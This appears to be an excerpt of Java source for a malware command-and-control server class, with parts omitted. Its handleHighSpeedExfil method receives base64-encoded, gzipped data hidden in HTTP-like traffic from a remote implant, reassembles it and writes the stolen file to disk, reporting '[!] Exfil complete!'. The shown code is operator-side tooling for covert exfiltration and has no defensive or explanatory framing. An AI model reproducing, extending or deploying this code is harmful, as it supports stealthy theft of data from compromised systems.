...
public class CommandServer implements Runnable{
	...
	String fun = "      _____                    _____                    _____                _____          \r\n" +
			"     |\\    \\                  /\\    \\                  /\\    \\              /\\    \\         \r\n" +
			"     |:\\____\\                /::\\    \\                /::\\    \\            /::\\    \\        \r\n" +
			"     |::|   |               /::::\\    \\              /::::\\    \\           \\:::\\    \\       \r\n" +
			"     |::|   |              /::::::\\    \\            /::::::\\    \\           \\:::\\    \\      \r\n" +
	...
	private void sendAll(Socket s, String clientHello, boolean skipLast) throws IOException {
		...
		for(String pack : allPacks){
			s.getOutputStream().write(pack.getBytes());
			s.getOutputStream().flush();
			if(skipLast && iterator++==allPacks.size()-1){
				System.out.println("[D] Tripped packet skip, ignoring response");
				readAll(s);
				s.getOutputStream().write(pack.getBytes());
				s.getOutputStream().flush();
			}
	...
	private void handleHighSpeedExfil(String command, Socket socket) throws IOException{ //Sequencing is wrong, probably has something to do with the HTTP cloaking
		...
		while(respText.indexOf("%%%")==-1){
			if(respText.indexOf("thecutestkittens")!=-1){
				respText = readAll(socket);
				System.out.println(respText);
				break;
			}
			int startIndex = respText.indexOf("/")+1;
			int endIndex = respText.indexOf("%");
			String b64Data = "";
			try{
				b64Data = respText.substring(startIndex, endIndex);
			}catch(Exception e){
				System.out.println(respText);
				e.printStackTrace();
			}
		...
		FileOutputStream debugOut = new FileOutputStream(new File("debug.txt"));
		debugOut.write(totalB64.getBytes());
		debugOut.flush();
		debugOut.close();
		System.out.println("[D] Debug output completed");
		byte[] decodedBytes = Base64.getDecoder().decode(totalB64.getBytes());
		ByteArrayInputStream zippedFileBytes = new ByteArrayInputStream(decodedBytes);
		GZIPInputStream gunzipper = new GZIPInputStream(zippedFileBytes);
		byte[] unzippedFileBytes = readAllZippedData(gunzipper);
		System.out.println("[!] Exfil complete!");
		System.out.print("Enter File Name: ");
		String fileName = stdin.nextLine();
		FileOutputStream fos = new FileOutputStream(new File(fileName));
		fos.write(unzippedFileBytes);
		fos.flush();
		fos.close();
	...
	private byte[] readAllZippedData(GZIPInputStream in){
		ArrayList<Byte> output = null;
		try {
			output = new ArrayList<Byte>();
			
			while(in.available()==1){
				output.add((byte) in.read());
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		...
		for(int i = 0; i < outBytes.length; i++){
			outBytes[i]=output.get(i).byteValue();
		}
